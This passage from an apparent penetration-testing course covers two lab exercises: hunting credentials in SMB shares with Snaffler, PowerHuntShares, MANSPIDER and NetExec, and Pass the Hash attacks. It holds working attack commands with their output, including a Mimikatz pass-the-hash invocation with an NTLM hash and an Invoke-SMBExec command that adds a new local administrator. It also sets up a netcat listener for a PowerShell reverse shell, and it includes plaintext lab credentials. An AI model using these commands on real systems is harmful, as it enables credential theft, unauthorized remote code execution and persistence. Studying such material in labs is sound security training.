[INLANEFREIGHT<span class="hljs-tag">\<span class="hljs-name">jbader</span></span>@DC01] 2025-05-01 17:41:43Z [Share] {Green}&lt;<span class="hljs-tag">\<span class="hljs-name">\</span></span>DC01.inlanefreight.local<span class="hljs-tag">\<span class="hljs-name">SYSVOL</span></span>&gt;(R) Logon server share
[INLANEFREIGHT<span class="hljs-tag">\<span class="hljs-name">jbader</span></span>@DC01] 2025-05-01 17:41:51Z [File] {Red}&lt;KeepPassOrKeyInCode|R|passw?o?r?d?&gt;<span class="hljs-tag">\<span class="hljs-name">s*</span><span class="hljs-string">[^\s&lt;]</span></span>+<span class="hljs-tag">\<span class="hljs-name">s*</span></span>&lt;|2.3kB|2025-05-01 05:22:48Z&gt;(<span class="hljs-tag">\<span class="hljs-name">\</span></span>DC01.inlanefreight.local<span class="hljs-tag">\<span class="hljs-name">ADMIN</span></span>$</span><span class="hljs-tag">\<span class="hljs-name">Panther</span></span><span class="hljs-tag">\<span class="hljs-name">unattend</span></span>.xml) 5"<span class="hljs-tag">\<span class="hljs-name"> </span></span>language="neutral"<span class="hljs-tag">\<span class="hljs-name"> </span></span>versionScope="nonSxS"<span class="hljs-tag">\<span class="hljs-name"> </span></span>xmlns:wcm="http://schemas<span class="hljs-tag">\<span class="hljs-name">.</span></span>microsoft<span class="hljs-tag">\<span class="hljs-name">.</span></span>com/WMIConfig/2002/State"<span class="hljs-tag">\<span class="hljs-name"> </span></span>xmlns:xsi="http://www<span class="hljs-tag">\<span class="hljs-name">.</span></span>w3<span class="hljs-tag">\<span class="hljs-name">.</span></span>org/2001/XMLSchema-instance"&gt;<span class="hljs-tag">\<span class="hljs-name">n</span></span><span class="hljs-tag">\<span class="hljs-name">t</span></span><span class="hljs-tag">\<span class="hljs-name">t</span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span>&lt;UserAccounts&gt;<span class="hljs-tag">\<span class="hljs-name">n</span></span><span class="hljs-tag">\<span class="hljs-name">t</span></span><span class="hljs-tag">\<span class="hljs-name">t</span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span>&lt;AdministratorPassword&gt;<span class="hljs-tag">\<span class="hljs-name">*</span></span>SENSITIVE<span class="hljs-tag">\<span class="hljs-name">*</span></span>DATA<span class="hljs-tag">\<span class="hljs-name">*</span></span>DELETED<span class="hljs-tag">\<span class="hljs-name">*</span></span>&lt;/AdministratorPassword&gt;<span class="hljs-tag">\<span class="hljs-name">n</span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span>&lt;/UserAccounts&gt;<span class="hljs-tag">\<span class="hljs-name">n</span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span>&lt;OOBE&gt;<span class="hljs-tag">\<span class="hljs-name">n</span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span>&lt;HideEULAPage&gt;true&lt;/HideEULAPage&gt;<span class="hljs-tag">\<span class="hljs-name">n</span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span>&lt;/OOBE&gt;<span class="hljs-tag">\<span class="hljs-name">n</span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span>&lt;/component
[INLANEFREIGHT<span class="hljs-tag">\<span class="hljs-name">jbader</span></span>@DC01] 2025-05-01 17:41:53Z [File] {Yellow}&lt;KeepDeployImageByExtension|R|^<span class="hljs-tag">\<span class="hljs-name">.</span></span>wim<span class="hljs-formula">$|29.2MB|2022-02-25 16:36:53Z&gt;(<span class="hljs-tag">\<span class="hljs-name">\</span></span>DC01.inlanefreight.local<span class="hljs-tag">\<span class="hljs-name">ADMIN</span></span>$</span><span class="hljs-tag">\<span class="hljs-name">Containers</span></span><span class="hljs-tag">\<span class="hljs-name">serviced</span></span><span class="hljs-tag">\<span class="hljs-name">WindowsDefenderApplicationGuard</span></span>.wim) .wim
[INLANEFREIGHT<span class="hljs-tag">\<span class="hljs-name">jbader</span></span>@DC01] 2025-05-01 17:41:58Z [File] {Red}&lt;KeepPassOrKeyInCode|R|passw?o?r?d?&gt;<span class="hljs-tag">\<span class="hljs-name">s*</span><span class="hljs-string">[^\s&lt;]</span></span>+<span class="hljs-tag">\<span class="hljs-name">s*</span></span>&lt;|2.3kB|2025-05-01 05:22:48Z&gt;(<span class="hljs-tag">\<span class="hljs-name">\</span></span>DC01.inlanefreight.local<span class="hljs-tag">\<span class="hljs-name">C</span></span><span class="hljs-formula">$<span class="hljs-tag">\<span class="hljs-name">Windows</span></span><span class="hljs-tag">\<span class="hljs-name">Panther</span></span><span class="hljs-tag">\<span class="hljs-name">unattend</span></span>.xml) 5"<span class="hljs-tag">\<span class="hljs-name"> </span></span>language="neutral"<span class="hljs-tag">\<span class="hljs-name"> </span></span>versionScope="nonSxS"<span class="hljs-tag">\<span class="hljs-name"> </span></span>xmlns:wcm="http://schemas<span class="hljs-tag">\<span class="hljs-name">.</span></span>microsoft<span class="hljs-tag">\<span class="hljs-name">.</span></span>com/WMIConfig/2002/State"<span class="hljs-tag">\<span class="hljs-name"> </span></span>xmlns:xsi="http://www<span class="hljs-tag">\<span class="hljs-name">.</span></span>w3<span class="hljs-tag">\<span class="hljs-name">.</span></span>org/2001/XMLSchema-instance"&gt;<span class="hljs-tag">\<span class="hljs-name">n</span></span><span class="hljs-tag">\<span class="hljs-name">t</span></span><span class="hljs-tag">\<span class="hljs-name">t</span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span>&lt;UserAccounts&gt;<span class="hljs-tag">\<span class="hljs-name">n</span></span><span class="hljs-tag">\<span class="hljs-name">t</span></span><span class="hljs-tag">\<span class="hljs-name">t</span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span>&lt;AdministratorPassword&gt;<span class="hljs-tag">\<span class="hljs-name">*</span></span>SENSITIVE<span class="hljs-tag">\<span class="hljs-name">*</span></span>DATA<span class="hljs-tag">\<span class="hljs-name">*</span></span>DELETED<span class="hljs-tag">\<span class="hljs-name">*</span></span>&lt;/AdministratorPassword&gt;<span class="hljs-tag">\<span class="hljs-name">n</span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span>&lt;/UserAccounts&gt;<span class="hljs-tag">\<span class="hljs-name">n</span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span>&lt;OOBE&gt;<span class="hljs-tag">\<span class="hljs-name">n</span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span>&lt;HideEULAPage&gt;true&lt;/HideEULAPage&gt;<span class="hljs-tag">\<span class="hljs-name">n</span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span>&lt;/OOBE&gt;<span class="hljs-tag">\<span class="hljs-name">n</span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span>&lt;/component
&lt;SNIP&gt;</span>
</code></pre>
<p>All of the tools covered in this section output a <code>large amount of information</code>. While they assist with automation, a fair amount of manual review is typically required, as many matches may turn out to be <code>&quot;false positives&quot;</code>. Two useful parameters that can help refine Snaffler&#39;s search process are:</p>
<ul>
<li><code>-u</code> retrieves a list of users from Active Directory and searches for references to them in files</li>
<li><code>-i</code> and <code>-n</code> allow you to specify which shares should be included in the search</li>
</ul>
<p><strong>PowerHuntShares</strong></p>
<p>Another tool that can be used is <a href="https://github.com/NetSPI/PowerHuntShares">PowerHuntShares</a>, a PowerShell script that doesn&#39;t necessarily need to be run on a domain-joined machine. One of its most useful features is that it generates an <code>HTML report</code> upon completion, providing an easy-to-use UI for reviewing the results:</p>
<p><img src="https://academy.hackthebox.com/storage/modules/308/img/Net_1.png" alt="Summary report from PowerHuntShares showing findings: 5 critical, 0 high, 0 medium, 2 low. Data exposure includes 21 interesting, 2 sensitive, 2 secrets files."></p>
<p>We can run a basic scan using <code>PowerHuntShares</code> like so:</p>
<p>&#x20; Credential Hunting in Network Shares</p>
<pre><code class="lang-powershell-session">PS C:\Users\Public\PowerHuntShares&gt; Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public

 ===============================================================
 INVOKE-HUNTSMBSHARES
 ===============================================================
  This function automates the following tasks:

  o Determine current computer's domain
  o Enumerate domain computers
  o Check if computers respond to ping requests
  o Filter for computers that have TCP 445 open and accessible
  o Enumerate SMB shares
  o Enumerate SMB share permissions
  o Identify shares with potentially excessive privileges
  o Identify shares that provide read or write access
  o Identify shares thare are high risk
  o Identify common share owners, names, &amp; directory listings
  o Generate last written &amp; last accessed timelines
  o Generate html summary report and detailed csv files

  Note: This can take hours to run in large environments.
 ---------------------------------------------------------------
 |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
 ---------------------------------------------------------------
 SHARE DISCOVERY
 ---------------------------------------------------------------
 [<span class="hljs-string">*</span>][<span class="hljs-symbol">05/01/2025 12:51</span>] Scan Start
 [<span class="hljs-string">*</span>][<span class="hljs-symbol">05/01/2025 12:51</span>] Output Directory: c:\Users\Public\SmbShareHunt-05012025125123
 [<span class="hljs-string">*</span>][<span class="hljs-symbol">05/01/2025 12:51</span>] Successful connection to domain controller: DC01.inlanefreight.local
 [<span class="hljs-string">*</span>][<span class="hljs-symbol">05/01/2025 12:51</span>] Performing LDAP query for computers associated with the inlanefreight.local domain
 [<span class="hljs-string">*</span>][<span class="hljs-symbol">05/01/2025 12:51</span>] -  computers found
 [<span class="hljs-string">*</span>][<span class="hljs-symbol">05/01/2025 12:51</span>] - 0 subnets found
 [<span class="hljs-string">*</span>][<span class="hljs-symbol">05/01/2025 12:51</span>] Pinging  computers
 [<span class="hljs-string">*</span>][<span class="hljs-symbol">05/01/2025 12:51</span>] -  computers responded to ping requests.
 [<span class="hljs-string">*</span>][<span class="hljs-symbol">05/01/2025 12:51</span>] Checking if TCP Port 445 is open on  computers
 [<span class="hljs-string">*</span>][<span class="hljs-symbol">05/01/2025 12:51</span>] - 1 computers have TCP port 445 open.
 [<span class="hljs-string">*</span>][<span class="hljs-symbol">05/01/2025 12:51</span>] Getting a list of SMB shares from 1 computers
 [<span class="hljs-string">*</span>][<span class="hljs-symbol">05/01/2025 12:51</span>] - 11 SMB shares were found.
 [<span class="hljs-string">*</span>][<span class="hljs-symbol">05/01/2025 12:51</span>] Getting share permissions from 11 SMB shares
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">SNIP</span>&gt;</span></span>
</code></pre>
<h3 id="hunting-from-linux">Hunting from Linux</h3>
<p><strong>MANSPIDER</strong></p>
<p>If we don’t have access to a domain-joined computer, or simply prefer to search for files remotely, tools like <a href="https://github.com/blacklanternsecurity/MANSPIDER">MANSPIDER</a> allow us to scan SMB shares from Linux. It&#39;s best to run <code>MANSPIDER</code> using the official Docker container to avoid dependency issues. Like the other tools, <code>MANSPIDER</code> offers many parameters that can be configured to fine-tune the search. A basic scan for files containing the string <code>passw</code> can be run as follows:</p>
<p>&#x20; Credential Hunting in Network Shares</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ docker run --rm -v ./</span><span class="hljs-string">manspider:</span><span class="hljs-regexp">/root/</span>.manspider blacklanternsecurity/manspider <span class="hljs-number">10.129</span><span class="hljs-number">.234</span><span class="hljs-number">.121</span> -c <span class="hljs-string">'passw'</span> -u <span class="hljs-string">'mendres'</span> -p <span class="hljs-string">'Inlanefreight2025!'</span>

[+] MANSPIDER command <span class="hljs-string">executed:</span> <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>manspider <span class="hljs-number">10.129</span><span class="hljs-number">.234</span><span class="hljs-number">.121</span> -c passw -u mendres -p Inlanefreight2025!
[+] Skipping files larger than <span class="hljs-number">10.00</span>MB
[+] Using <span class="hljs-number">5</span> threads
[+] Searching by file <span class="hljs-string">content:</span> <span class="hljs-string">"passw"</span>
[+] Matching files will be downloaded to <span class="hljs-regexp">/root/</span>.manspider/loot
[+] <span class="hljs-number">10.129</span><span class="hljs-number">.234</span><span class="hljs-number">.121</span>: Successful login <span class="hljs-keyword">as</span> <span class="hljs-string">"mendres"</span>
[+] <span class="hljs-number">10.129</span><span class="hljs-number">.234</span><span class="hljs-number">.121</span>: Successful login <span class="hljs-keyword">as</span> <span class="hljs-string">"mendres"</span>
&lt;SNIP&gt;
</code></pre>
<p><strong>NetExec</strong></p>
<p>In addition to its many other uses, <code>NetExec</code> can also be used to search through network shares using the <code>--spider</code> option. This functionality is described in great detail on the <a href="https://www.netexec.wiki/smb-protocol/spidering-shares">official wiki</a>. A basic scan of network shares for files containing the string <code>&quot;passw&quot;</code> can be run like so:</p>
<p>&#x20; Credential Hunting in Network Shares</p>
<pre><code class="lang-shell-session">root@htb<span class="hljs-string">[/htb]</span>$ nxc smb <span class="hljs-number">10.129.234.121</span> -u mendres -p 'Inlanefreight2025!' --spider IT --content --pattern <span class="hljs-string">"passw"</span>

SMB         <span class="hljs-number">10.129.234.121</span>  <span class="hljs-number">445</span>    DC01             <span class="hljs-string">[*]</span> Windows <span class="hljs-number">10</span> / Server <span class="hljs-number">2019</span> Build <span class="hljs-number">17763</span> x64 (name:DC01) (domain:inlanefreight.local) (signing:True) (SMBv1:False)
SMB         <span class="hljs-number">10.129.234.121</span>  <span class="hljs-number">445</span>    DC01             <span class="hljs-string">[+]</span> inlanefreight.local\mendres:Inlanefreight2025! 
SMB         <span class="hljs-number">10.129.234.121</span>  <span class="hljs-number">445</span>    DC01             <span class="hljs-string">[*]</span> Started spidering
SMB         <span class="hljs-number">10.129.234.121</span>  <span class="hljs-number">445</span>    DC01             <span class="hljs-string">[*]</span> Spidering .
&lt;SNIP&gt;
</code></pre>
<hr>
<h2 id="pass-the-hash-pth-">Pass the Hash (PtH)</h2>
<p>A <a href="https://attack.mitre.org/techniques/T1550/002/">Pass the Hash (PtH)</a> attack is a technique where an attacker uses a password hash instead of the plain text password for authentication. The attacker doesn&#39;t need to decrypt the hash to obtain a plaintext password. PtH attacks exploit the authentication protocol, as the password hash remains static for every session until the password is changed.</p>
<p>As discussed in the previous sections, the attacker must have administrative privileges or particular privileges on the target machine to obtain a password hash. Hashes can be obtained in several ways, including:</p>
<ul>
<li>Dumping the local SAM database from a compromised host.</li>
<li>Extracting hashes from the NTDS database (ntds.dit) on a Domain Controller.</li>
<li>Pulling the hashes from memory (lsass.exe).</li>
</ul>
<p>Let&#39;s assume we obtain the password hash (<code>64F12CDDAA88057E06A81B54E73B949B</code>) for the account <code>julio</code> from the domain <code>inlanefreight.htb</code>. Let&#39;s see how we can perform Pass the Hash attacks from Windows and Linux machines.</p>
<p>Note: The tools we will be using are located in the <code>C:\tools</code> directory on the target host. Once you start the machine and complete the exercises, you can use the tools in that directory. This lab contains two machines, you will have access to one (MS01), and from there, you will connect to the second machine (DC01).</p>
<h3 id="introduction-to-windows-ntlm">Introduction to Windows NTLM</h3>
<p>Microsoft&#39;s <a href="https://learn.microsoft.com/en-us/windows-server/security/kerberos/ntlm-overview">Windows New Technology LAN Manager (NTLM)</a> is a set of security protocols that authenticates users&#39; identities while also protecting the integrity and confidentiality of their data. NTLM is a single sign-on (SSO) solution that uses a challenge-response protocol to verify the user&#39;s identity without having them provide a password.</p>
<p>Despite its known flaws, NTLM is still commonly used to ensure compatibility with legacy clients and servers, even on modern systems. While Microsoft continues to support NTLM, Kerberos has taken over as the default authentication mechanism in Windows 2000 and subsequent Active Directory (AD) domains.</p>
<p>With NTLM, passwords stored on the server and domain controller are not &quot;salted,&quot; which means that an adversary with a password hash can authenticate a session without knowing the original password. We call this a <code>Pass the Hash (PtH) Attack</code>.</p>
<h3 id="pass-the-hash-with-mimikatz-windows-">Pass the Hash with Mimikatz (Windows)</h3>
<p>The first tool we will use to perform a Pass the Hash attack is <a href="https://github.com/gentilkiwi">Mimikatz</a>. Mimikatz has a module named <code>sekurlsa::pth</code> that allows us to perform a Pass the Hash attack by starting a process using the hash of the user&#39;s password. To use this module, we will need the following:</p>
<ul>
<li><code>/user</code> - The user name we want to impersonate.</li>
<li><code>/rc4</code> or <code>/NTLM</code> - NTLM hash of the user&#39;s password.</li>
<li><code>/domain</code> - Domain the user to impersonate belongs to. In the case of a local user account, we can use the computer name, localhost, or a dot (.).</li>
<li><code>/run</code> - The program we want to run with the user&#39;s context (if not specified, it will launch cmd.exe).</li>
</ul>
<p><strong>Pass the Hash from Windows Using Mimikatz</strong></p>
<p>&#x20; Pass the Hash (PtH)</p>
<pre><code class="lang-cmd-session">c:<span class="hljs-string">\tools&gt;</span> mimikatz.exe privilege::debug <span class="hljs-string">"sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe"</span> exit

user    : julio
domain  : inlanefreight.htb
program : cmd.exe
impers. : <span class="hljs-literal">no</span>
NTLM    : <span class="hljs-number">64</span>F12CDDAA88057E06A81B54E73B949B
  |  PID  <span class="hljs-number">8404</span>
  |  TID  <span class="hljs-number">4268</span>
  |  LSA Process was already R/W
  |  LUID <span class="hljs-number">0</span> ; <span class="hljs-number">5218172</span> (<span class="hljs-number">00000000</span>:<span class="hljs-number">004f</span>9f7c)
  <span class="hljs-string">\_</span> msv1_0   - data copy @ <span class="hljs-number">0000028</span>FC91AB510 : OK !
  <span class="hljs-string">\_</span> kerberos - data copy @ <span class="hljs-number">0000028</span>FC964F288
   <span class="hljs-string">\_</span> des_cbc_md4<span class="hljs-function">       -&gt;</span> <span class="hljs-literal">null</span>
   <span class="hljs-string">\_</span> des_cbc_md4       OK
   <span class="hljs-string">\_</span> des_cbc_md4       OK
   <span class="hljs-string">\_</span> des_cbc_md4       OK
   <span class="hljs-string">\_</span> des_cbc_md4       OK
   <span class="hljs-string">\_</span> des_cbc_md4       OK
   <span class="hljs-string">\_</span> des_cbc_md4       OK
   <span class="hljs-string">\_</span> *Password replace @ <span class="hljs-number">0000028</span>FC9673AE8 <span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">32</span>)</span> -&gt;</span> <span class="hljs-literal">null</span>
</code></pre>
<p>Now we can use cmd.exe to execute commands in the user&#39;s context. For this example, <code>julio</code> can connect to a shared folder named <code>julio</code> on the DC.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/308/img/pth_julio.jpg" alt="Command prompt showing mimikatz execution with privilege escalation and directory listing commands."></p>
<h3 id="pass-the-hash-with-powershell-invoke-thehash-windows-">Pass the Hash with PowerShell Invoke-TheHash (Windows)</h3>
<p>Another tool we can use to perform Pass the Hash attacks on Windows is <a href="https://github.com/Kevin-Robertson/Invoke-TheHash">Invoke-TheHash</a>. This tool is a collection of PowerShell functions for performing Pass the Hash attacks with WMI and SMB. WMI and SMB connections are accessed through the .NET TCPClient. Authentication is performed by passing an NTLM hash into the NTLMv2 authentication protocol. Local administrator privileges are not required client-side, but the user and hash we use to authenticate need to have administrative rights on the target computer. For this example we will use the user <code>julio</code> and the hash <code>64F12CDDAA88057E06A81B54E73B949B</code>.</p>
<p>When using <code>Invoke-TheHash</code>, we have two options: SMB or WMI command execution. To use this tool, we need to specify the following parameters to execute commands in the target computer:</p>
<ul>
<li><code>Target</code> - Hostname or IP address of the target.</li>
<li><code>Username</code> - Username to use for authentication.</li>
<li><code>Domain</code> - Domain to use for authentication. This parameter is unnecessary with local accounts or when using the @domain after the username.</li>
<li><code>Hash</code> - NTLM password hash for authentication. This function will accept either LM:NTLM or NTLM format.</li>
<li><code>Command</code> - Command to execute on the target. If a command is not specified, the function will check to see if the username and hash have access to WMI on the target.</li>
</ul>
<p>The following command will use the SMB method for command execution to create a new user named mark and add the user to the Administrators group.</p>
<p><strong>Invoke-TheHash with SMB</strong></p>
<p>&#x20; Pass the Hash (PtH)</p>
<pre><code class="lang-powershell-session">PS c:\htb&gt; cd C:\tools\Invoke-TheHash\
PS c:\tools\Invoke-TheHash&gt; Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash&gt; Invoke-SMBExec -Target <span class="hljs-number">172.16</span><span class="hljs-number">.1</span><span class="hljs-number">.10</span> -Domain inlanefreight.htb -Username julio -Hash <span class="hljs-number">64</span>F12CDDAA88057E06A81B54E73B949B -Command <span class="hljs-string">"net user mark Password123 /add &amp;&amp; net localgroup administrators mark /add"</span> -Verbose

VERBOSE: [+] inlanefreight.htb\julio successfully authenticated <span class="hljs-keyword">on</span> <span class="hljs-number">172.16</span><span class="hljs-number">.1</span><span class="hljs-number">.10</span>
VERBOSE: inlanefreight.htb\julio has Service Control Manager <span class="hljs-built_in">write</span> privilege <span class="hljs-keyword">on</span> <span class="hljs-number">172.16</span><span class="hljs-number">.1</span><span class="hljs-number">.10</span>
VERBOSE: Service EGDKNNLQVOLFHRQTQMAU created <span class="hljs-keyword">on</span> <span class="hljs-number">172.16</span><span class="hljs-number">.1</span><span class="hljs-number">.10</span>
VERBOSE: [*] Trying <span class="hljs-keyword">to</span> execute command <span class="hljs-keyword">on</span> <span class="hljs-number">172.16</span><span class="hljs-number">.1</span><span class="hljs-number">.10</span>
[+] Command executed <span class="hljs-keyword">with</span> service EGDKNNLQVOLFHRQTQMAU <span class="hljs-keyword">on</span> <span class="hljs-number">172.16</span><span class="hljs-number">.1</span><span class="hljs-number">.10</span>
VERBOSE: Service EGDKNNLQVOLFHRQTQMAU deleted <span class="hljs-keyword">on</span> <span class="hljs-number">172.16</span><span class="hljs-number">.1</span><span class="hljs-number">.10</span>
</code></pre>
<p>We can also get a reverse shell connection in the target machine. If you are unfamiliar with reverse shells, review the <a href="https://academy.hackthebox.com/module/details/115">Shells &amp; Payloads</a> module on HTB Academy.</p>
<p>To get a reverse shell, we need to start our listener using Netcat on our Windows machine, which has the IP address <code>172.16.1.5</code>. We will use port <code>8001</code> to wait for the connection.</p>
<p><strong>Netcat listener</strong></p>
<p>&#x20; Pass the Hash (PtH)</p>
<pre><code class="lang-powershell-session">PS C:<span class="hljs-string">\tools&gt;</span> .<span class="hljs-string">\nc.exe</span> -lvnp <span class="hljs-number">8001</span>

listening <span class="hljs-literal">on</span> [any] <span class="hljs-number">8001</span> ...
</code></pre>
<p>To create a simple reverse shell using PowerShell, we can visit <a href="https://www.revshells.com/">revshells.com</a>, set our IP <code>172.16.1.5</code> and port <code>8001</code>, and select the option <code>PowerShell #3 (Base64)</code>, as shown in the following image.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/308/img/rshellonline.jpg" alt="Reverse Shell Generator interface with IP 172.16.1.5, port 8001, and PowerShell Base64 payload."></p>
<p>Now we can execute <code>Invoke-TheHash</code> to execute our PowerShell reverse shell script in the target computer. Notice that instead of providing the IP address, which is <code>172.16.1.10</code>, we will use the machine name <code>DC01</code> (either would work).</p>
<p><strong>Invoke-TheHash with WMI</strong></p>
<p>&#x20; Pass the Hash (PtH)</p>
<pre><code class="lang-powershell-session">PS c:<span class="hljs-string">\tools\Invoke-TheHash&gt;</span> Import-Module .<span class="hljs-string">\Invoke-TheHash.psd1</span>
